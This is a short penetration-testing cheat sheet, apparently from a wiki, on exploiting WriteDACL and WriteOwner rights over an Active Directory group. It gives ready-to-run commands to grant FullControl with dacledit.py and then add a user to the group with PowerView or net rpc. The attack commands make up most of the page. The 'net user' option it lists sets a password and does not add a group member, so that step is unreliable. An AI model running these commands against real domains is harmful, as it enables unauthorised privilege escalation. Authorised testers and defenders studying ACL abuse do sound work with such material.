# Owns Permissions (WriteDACL + WriteOwner) Exploitation on Groups

## Owns Permissions (WriteDACL + WriteOwner) Exploitation on Groups [t-ad-acl-acl_groups_owns]

### Overview

Owns Permissions (WriteDACL + WriteOwner) allows to add GerericAll permission, then it can be used to add users to the group.


### References:

* [https://habr.com/ru/companies/solarsecurity/articles/681108/](https://habr.com/ru/companies/solarsecurity/articles/681108/)

* [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)

### 1.1 Modify ACL on the group (add GenericAll permissions)



{% code overflow="wrap" %}
```bash
python3 examples/dacledit.py -action write -rights FullControl -k -principal <username> -target "<groupname>" -dc-ip <dc-ip>  domain.com/username@dc.domain.com -debug
```
{% endcode %}

### 1.2 Add a user to the group




**option 1: net user**

{% code overflow="wrap" %}
```bash
net user <username> <password> /domain
```
{% endcode %}


**option 2: powerview**

{% code overflow="wrap" %}
```bash
Add-DomainGroupMember -Identity "<GroupName>" -Members username -Verbose
```
{% endcode %}


**option 3: net rpc (linux)**

{% code overflow="wrap" %}
```bash
net rpc group addmem "domain.com\group name" <username> -U 'domain.com\username' -S dc.domain.com
```
{% endcode %}

{% hint style="info" %}--use-kerberos=required can be added for kerberos

{% endhint %}

